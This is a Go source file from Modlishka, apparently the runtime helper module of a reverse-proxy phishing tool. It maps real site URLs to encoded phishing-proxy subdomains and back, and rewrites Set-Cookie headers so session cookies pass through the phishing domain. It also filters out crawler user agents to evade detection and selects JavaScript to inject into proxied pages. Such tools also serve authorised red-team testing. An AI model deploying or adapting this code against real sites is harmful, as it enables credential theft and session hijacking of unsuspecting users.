package runtime

import (
    "crypto/rand"
    "fmt"
    "github.com/drk1wi/Modlishka/log"
    "github.com/miekg/dns"
    "net/url"
    "regexp"
    "strings"
)

//set up regexp upfront

func MakeRegexes() {

    var err error

    regexpStr := MATCH_URL_REGEXP
    RegexpUrl, err = regexp.Compile(regexpStr)
    if err != nil {
        log.Fatalf(err.Error() + "Terminating.")

    }

    regexpStr = `(([a-z0-9.]+)+` + TopLevelDomain + `)`
    RegexpSubdomainWithoutScheme, err = regexp.Compile(regexpStr)
    if err != nil {
        log.Fatalf(err.Error() + "Terminating.")
    }

    regexpStr = `(?:([a-z0-9-]+|\*)\.)?` + ProxyDomain + `\b`
    RegexpPhishSubdomainUrlWithoutScheme, err = regexp.Compile(regexpStr)
    if err != nil {
        log.Fatalf(err.Error() + "Terminating.")
    }

    RegexpCookieTracking, err = regexp.Compile(TrackingCookie + TRACKING_COOKIE_REGEXP)
    if err != nil {
        log.Fatalf(err.Error() + "Terminating.")
    }

    RegexpSubdomain, err = regexp.Compile(IS_SUBDOMAIN_REGEXP)
    if err != nil {
        log.Fatalf(err.Error() + "Terminating.")
    }

    RegexpFindSetCookie, err = regexp.Compile(SET_COOKIE)
    if err != nil {
        log.Fatalf(err.Error() + "Terminating.")
    }

    RegexpSetCookie, err = regexp.Compile(MATCH_URL_REGEXP_WITHOUT_SCHEME)
    if err != nil {
        log.Fatalf(err.Error() + "Terminating.")
    }

    emlregex := `^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$`
    RegexpEmail, err = regexp.Compile(emlregex)
    if err != nil {
        log.Fatalf(err.Error() + "Terminating.")
    }
}

// Random Ascii-String Generator
func RandSeq(n int) string {
    const alphanum = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    var bytes = make([]byte, n)
    rand.Read(bytes)
    for i, b := range bytes {
        bytes[i] = alphanum[b%byte(len(alphanum))]
    }
    return string(bytes)
}

func RetAbsRegex (input string) *regexp.Regexp {
    if len(input) > 0 {
        return regexp.MustCompile(input)
    }
    return regexp.MustCompile(string("\\s"))
}

func TranslateRequestHost(host string) (string, bool, bool) {

    newTarget := Target
    newTls := false
    tlsVal := false
    // first HTTP request client domain hook
    if DynamicMode == true && strings.Contains(host, ProxyDomain) == false{
        return host,newTls, tlsVal
    }
    
    sub := strings.Replace(host, ProxyDomain, "", -1)
    if sub != "" {
        log.Debugf("Subdomain: %s ", sub[:len(sub)-1])

        decoded, newTls, tlsVal, err :=  DecodeSubdomain(sub[:len(sub)-1])
        if err == nil {
            if _, ok := dns.IsDomainName(string(decoded)); ok {
                log.Debugf("Subdomain contains encrypted base32  domain: %s ", string(decoded))
                return  string(decoded), newTls, tlsVal
            }

        } else { //not hex encoded, treat as normal subdomain
            log.Debugf("Standard subdomain: %s ", sub[:len(sub)-1])
            return  sub[:len(sub)-1] + "." +  TopLevelDomain, newTls, tlsVal
        }
    }



    return newTarget,newTls, tlsVal
}

func TranslateSetCookie(cookie string) string {
    ret := RegexpSetCookie.ReplaceAllStringFunc(cookie, RealURLtoPhish)

    return ret

}

func RealURLtoPhish(realURL string) string {

    //var domain string
    var host string
    var out string
    var tls bool

    decoded := fmt.Sprintf("%s", realURL)
    u, _ := url.Parse(decoded)
    out = realURL

    if u.Host != "" {
        host = u.Host
    } else {
        host = realURL
    }


    if u.Scheme == "http" {
        tls = false
    } else if u.Scheme == "https"{
        tls = true
    } else {
        tls = ForceHTTP
    }

    if ForceHTTPS == true || ForceHTTP == true {
        encoded, _ :=  EncodeSubdomain(host,tls)
        out = strings.Replace(out, host, encoded+"."+ProxyDomain, 1)
    } else {

        if strings.Contains(realURL,  TopLevelDomain) { //subdomain in main domain
            out = strings.Replace(out, string( TopLevelDomain), ProxyDomain, 1)
        } else if realURL != "" {
            encoded, _ :=  EncodeSubdomain(host,tls)
            out = strings.Replace(out, host, encoded+"."+ProxyDomain, 1)
        }
    }

    return out
}

func PhishURLToRealURL(phishURL string) string {

    //var domain string

    var host string
    var out string
    rest := string("")

    // url parse returns nil when phishURL does not have protocol
    if strings.HasPrefix(phishURL, "https://") == false && strings.HasPrefix(phishURL, "http://") == false {
        u, _ := url.Parse(fmt.Sprintf("https://%s", phishURL))
        host = u.Host
        if u.Path != ""{rest = rest + u.Path}
        if u.RawQuery != ""{rest = rest +"?"+u.RawQuery}
    } else {
        u, _ := url.Parse(phishURL)
        if u.Host != "" {
            host = u.Host
        } else {
            host = phishURL
        }
        if u.Path != ""{rest = rest + u.Path}
        if u.RawQuery != ""{rest = rest +"?"+u.RawQuery}
    }
    
    out = phishURL

    if strings.Contains(phishURL, ProxyDomain) {
        subdomain := strings.Replace(host, "."+ProxyDomain, "", 1)
        // has subdomain
        if len(subdomain) > 0 {
            decodedDomain, _, _, err := DecodeSubdomain(subdomain)
            if err != nil {
                //return strings.Replace(out, ProxyDomain, TopLevelDomain, 1)
                rest = strings.Replace(out, ProxyDomain, TopLevelDomain, 1)+rest
                return rest
            }
            rest = string(decodedDomain)+rest
            return rest

            //return string(decodedDomain)
        }

        //return strings.Replace(out, ProxyDomain, TopLevelDomain, -1)
        rest = strings.Replace(out, ProxyDomain, TopLevelDomain, 1)+rest
        return rest
    }

    rest = out+rest
    return rest
    //return out
}

// Validate email
func TrueEmail(email string) bool {
    m := RegexpEmail.FindStringSubmatch(email)
    if len(m) > 0 {
        return true
    }
    return false
}

// Check if user-agent is blacklisted
func ValRobsRegex(ua string) bool {
    if len(ua) > 3 {
        for _, val := range Robots {
        log.Debugf("Validation UA =>  %s  against  pattern => %s ",ua,val)
            if strings.Contains(ua, val){
                return true
            }
        }
    }
    return false
}

//check if the requested URL matches termination URLS patterns and returns verdict
func CheckTermination(i string) bool {

    i = strings.ReplaceAll(PhishURLToRealURL(i), "//", "/")
    if len(TerminateTriggers) > 0 {
        for _,p := range TerminateTriggers {
            log.Debugf("Checking Terminatetrigger %s against %s :::  %b", p,i,strings.Contains(i, p))
            if strings.Contains(i,p) {
                log.Infof("TerminateTrigger FOUND: %s  ==> %s",p,i)
                return true
            }
        }
    }
    return false
}

func StripProtocol(URL string) string {
    var re = regexp.MustCompile(`^(http|https)://`)
    return re.ReplaceAllString(URL, "")
}

// returns JS payload based on a pattern
func GetJSRulesPayload(input string) string {
    if len(JSInjectStrings) > 0 {
        for key, _ := range JSInjectStrings {
            tm := RetAbsRegex(key).FindStringSubmatch(input)
            if len(tm) > 0 {
                return JSInjectStrings[key]
            }
        }
    }
    return ""
}

